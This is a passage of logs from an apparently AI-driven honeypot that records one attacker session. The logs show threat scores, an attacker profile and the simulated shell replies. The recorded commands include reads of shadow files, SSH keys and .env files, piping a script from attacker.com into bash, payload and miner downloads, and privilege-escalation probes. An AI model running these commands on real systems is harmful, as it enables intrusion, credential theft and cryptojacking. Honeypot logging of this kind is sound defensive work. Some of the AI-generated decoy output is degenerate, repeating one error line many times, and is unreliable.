        "final_score": 113,
        "threat_level": "CRITICAL",
        "base_score": 113,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 56,
            "unique_commands": 53,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 665,
            "commands_executed": 56,
            "successful_commands": 54,
            "failed_commands": 2,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 113,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:17:28,962 - {"session_id": "71dd20b2", "command": "find / -perm -4000 -type f 2>/dev/null", "attack_type": "System Enumeration", "risk_score": 113, "threat_level": "CRITICAL"}
2026-07-21 11:17:28,962 - {
    "session_id": "71dd20b2",
    "command": "find / -perm -4000 -type f 2>/dev/null",
    "ai_decision": "/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 56
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.85
    },
    "risk_score": 113,
    "threat_level": "CRITICAL"
}
2026-07-21 11:17:28,962 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: find / -perm -4000 -type f 2>/dev/null",
    "ai_decision": "/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "System Enumeration",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:17:43,268 - {
    "session_id": "71dd20b2",
    "query": "pkexec --version",
    "response": "pkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 123,
        "risk_level": "CRITICAL",
        "final_score": 123,
        "threat_level": "CRITICAL",
        "base_score": 123,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 57,
            "unique_commands": 54,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 665,
            "commands_executed": 57,
            "successful_commands": 54,
            "failed_commands": 3,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 123,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:17:43,269 - {"session_id": "71dd20b2", "command": "pkexec --version", "attack_type": "Privilege Escalation Attempt", "risk_score": 123, "threat_level": "CRITICAL"}
2026-07-21 11:17:43,269 - {
    "session_id": "71dd20b2",
    "command": "pkexec --version",
    "ai_decision": "pkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin",
    "confidence_score": 0.95,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 57
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.95
    },
    "risk_score": 123,
    "threat_level": "CRITICAL"
}
2026-07-21 11:17:43,269 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: pkexec --version",
    "ai_decision": "pkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin/sudoers: Permission denied\npkexec: error: unable to execute /usr/bin",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Privilege Escalation Attempt",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:18:01,203 - {
    "session_id": "71dd20b2",
    "query": "dirtycow",
    "response": "-bash: dirtycow: command not found\n\n[2023-12-01 14:30:00] AUDIT LOG: \nCommand executed: dirtycow\nUser: root\nReturn code: 127\nError message: bash: dirtycow: command not found",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 124,
        "risk_level": "CRITICAL",
        "final_score": 124,
        "threat_level": "CRITICAL",
        "base_score": 124,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 58,
            "unique_commands": 55,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 679,
            "commands_executed": 58,
            "successful_commands": 54,
            "failed_commands": 4,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 124,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:18:01,203 - {"session_id": "71dd20b2", "command": "dirtycow", "attack_type": "Unknown", "risk_score": 124, "threat_level": "CRITICAL"}
2026-07-21 11:18:01,204 - {
    "session_id": "71dd20b2",
    "command": "dirtycow",
    "ai_decision": "-bash: dirtycow: command not found\n\n[2023-12-01 14:30:00] AUDIT LOG: \nCommand executed: dirtycow\nUser: root\nReturn code: 127\nError message: bash: dirtycow: command not found",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 58
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 124,
    "threat_level": "CRITICAL"
}
2026-07-21 11:18:01,204 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: dirtycow",
    "ai_decision": "-bash: dirtycow: command not found\n\n[2023-12-01 14:30:00] AUDIT LOG: \nCommand executed: dirtycow\nUser: root\nReturn code: 127\nError message: bash: dirtycow: command not found",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:18:16,779 - {
    "session_id": "71dd20b2",
    "query": "sudo -l",
    "response": "[sudo] password for root: \n\nSorry, user root may not run sudo on prod-restricted-01.",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 129,
        "risk_level": "CRITICAL",
        "final_score": 129,
        "threat_level": "CRITICAL",
        "base_score": 129,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 59,
            "unique_commands": 56,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 697,
            "commands_executed": 59,
            "successful_commands": 55,
            "failed_commands": 4,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 129,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:18:16,779 - {"session_id": "71dd20b2", "command": "sudo -l", "attack_type": "Privilege Enumeration", "risk_score": 129, "threat_level": "CRITICAL"}
2026-07-21 11:18:16,780 - {
    "session_id": "71dd20b2",
    "command": "sudo -l",
    "ai_decision": "[sudo] password for root: \n\nSorry, user root may not run sudo on prod-restricted-01.",
    "confidence_score": 0.9,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 59
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.9
    },
    "risk_score": 129,
    "threat_level": "CRITICAL"
}
2026-07-21 11:18:16,780 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: sudo -l",
    "ai_decision": "[sudo] password for root: \n\nSorry, user root may not run sudo on prod-restricted-01.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Privilege Enumeration",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:18:16,868 - {
    "session_id": "71dd20b2",
    "query": "chmod +x payload.sh",
    "response": "None",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 130,
        "risk_level": "CRITICAL",
        "final_score": 130,
        "threat_level": "CRITICAL",
        "base_score": 130,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 60,
            "unique_commands": 57,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 713,
            "commands_executed": 60,
            "successful_commands": 55,
            "failed_commands": 5,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 130,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:18:16,869 - {"session_id": "71dd20b2", "command": "chmod +x payload.sh", "attack_type": "Unknown", "risk_score": 130, "threat_level": "CRITICAL"}
2026-07-21 11:18:16,869 - {
    "session_id": "71dd20b2",
    "command": "chmod +x payload.sh",
    "ai_decision": "None",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 60
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 130,
    "threat_level": "CRITICAL"
}
2026-07-21 11:18:16,869 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: chmod +x payload.sh",
    "ai_decision": "None",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:18:16,943 - {
    "session_id": "71dd20b2",
    "query": "chmod 777 /var/www/html/uploads",
    "response": "None",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 131,
        "risk_level": "CRITICAL",
        "final_score": 131,
        "threat_level": "CRITICAL",
        "base_score": 131,
